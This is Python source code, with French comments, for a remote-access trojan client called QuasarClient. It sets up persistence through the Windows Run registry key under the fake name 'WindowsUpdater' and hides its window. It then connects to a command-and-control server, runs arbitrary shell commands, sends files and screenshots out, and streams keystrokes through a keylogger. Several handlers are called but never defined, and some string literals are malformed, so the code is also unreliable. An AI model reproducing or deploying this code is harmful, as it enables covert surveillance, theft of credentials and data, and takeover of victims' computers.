
import socket
import threading
import time
import os
import sys
import subprocess
import json
import base64
from pathlib import Path
import logging

class QuasarClient:
    def __init__(self):
        self.server_host = "192.168.1.100"
        self.server_port = 4782
        self.password = "SuperSecurePassword123"
        self.install_path = r"%APPDATA%"
        self.install_name = "client.exe"
        self.startup = True
        self.hide_file = True
        self.keylogger_enabled = True
        self.webcam_enabled = False
        self.microphone_enabled = False
        self.reconnect_delay = 5000
        
        self.connected = False
        self.socket = None
        
    def install(self):
        """Installation persistante du client"""
        try:
            if self.startup:
                self.add_to_startup()
            if self.hide_file:
                self.hide_process()
        except Exception as e:
            pass
    
    def add_to_startup(self):
        """Ajoute le client au démarrage système"""
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                               "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdater", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
        except:
            pass
    
    def hide_process(self):
        """Masque le processus"""
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    def connect_to_server(self):
        """Connexion au serveur C&C"""
        while not self.connected:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.server_host, self.server_port))
                
                # Authentification
                auth_data = {
                    "type": "auth",
                    "password": self.password,
                    "client_info": self.get_system_info()
                }
                self.send_data(auth_data)
                
                response = self.receive_data()
                if response and response.get("status") == "authenticated":
                    self.connected = True
                    self.start_command_handler()
                else:
                    self.socket.close()
                    
            except Exception as e:
                time.sleep(self.reconnect_delay / 1000)
    
    def get_system_info(self):
        """Collecte les informations système"""
        import platform
        return {
            "os": platform.system(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "hostname": socket.gethostname(),
            "user": os.getlogin() if hasattr(os, 'getlogin') else "unknown"
        }
    
    def send_data(self, data):
        """Envoie des données au serveur"""
        try:
            message = json.dumps(data).encode('utf-8')
            self.socket.send(len(message).to_bytes(4, 'big'))
            self.socket.send(message)
        except:
            self.connected = False
    
    def receive_data(self):
        """Reçoit des données du serveur"""
        try:
            length = int.from_bytes(self.socket.recv(4), 'big')
            data = self.socket.recv(length)
            return json.loads(data.decode('utf-8'))
        except:
            self.connected = False
            return None
    
    def start_command_handler(self):
        """Gestionnaire de commandes"""
        while self.connected:
            try:
                command = self.receive_data()
                if not command:
                    break
                    
                self.execute_command(command)
                
            except Exception as e:
                self.connected = False
                break
    
    def execute_command(self, command):
        """Exécute une commande reçue"""
        cmd_type = command.get("type")
        
        if cmd_type == "shell":
            self.execute_shell_command(command.get("command", ""))
        elif cmd_type == "download":
            self.download_file(command.get("path", ""))
        elif cmd_type == "upload":
            self.upload_file(command.get("path", ""), command.get("data", ""))
        elif cmd_type == "screenshot":
            self.take_screenshot()
        elif cmd_type == "keylog_start" and self.keylogger_enabled:
            self.start_keylogger()
        elif cmd_type == "keylog_stop":
            self.stop_keylogger()
    
    def execute_shell_command(self, command):
        """Exécute une commande shell"""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            response = {
                "type": "shell_result",
                "command": command,
                "output": result.stdout,
                "error": result.stderr,
                "return_code": result.returncode
            }
            self.send_data(response)
        except Exception as e:
            self.send_data({"type": "error", "message": str(e)})
    
    def download_file(self, file_path):
        """Télécharge un fichier du client"""
        try:
            with open(file_path, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode('utf-8')
            
            response = {
                "type": "file_download",
                "path": file_path,
                "data": file_data,
                "size": os.path.getsize(file_path)
            }
            self.send_data(response)
        except Exception as e:
            self.send_data({"type": "error", "message": f"Erreur téléchargement: {str(e)}""})
    
    def take_screenshot(self):
        """Prend une capture d'écran"""
        try:
            from PIL import ImageGrab
            import io
            
            screenshot = ImageGrab.grab()
            img_buffer = io.BytesIO()
            screenshot.save(img_buffer, format='PNG')
            img_data = base64.b64encode(img_buffer.getvalue()).decode('utf-8')
            
            response = {
                "type": "screenshot",
                "data": img_data,
                "timestamp": time.time()
            }
            self.send_data(response)
        except Exception as e:
            self.send_data({"type": "error", "message": f"Erreur screenshot: {str(e)}""})
    
    def start_keylogger(self):
        """Démarre le keylogger"""
        if not self.keylogger_enabled:
            return
            
        def keylogger_thread():
            try:
                import pynput.keyboard as keyboard
                
                def on_key_press(key):
                    try:
                        key_data = {
                            "type": "keylog",
                            "key": str(key),
                            "timestamp": time.time()
                        }
                        self.send_data(key_data)
                    except:
                        pass
                
                with keyboard.Listener(on_press=on_key_press) as listener:
                    listener.join()
            except:
                pass
        
        threading.Thread(target=keylogger_thread, daemon=True).start()
    
    def run(self):
        """Point d'entrée principal"""
        self.install()
        
        while True:
            try:
                self.connect_to_server()
            except KeyboardInterrupt:
                break
            except:
                time.sleep(self.reconnect_delay / 1000)

if __name__ == "__main__":
    client = QuasarClient()
    client.run()
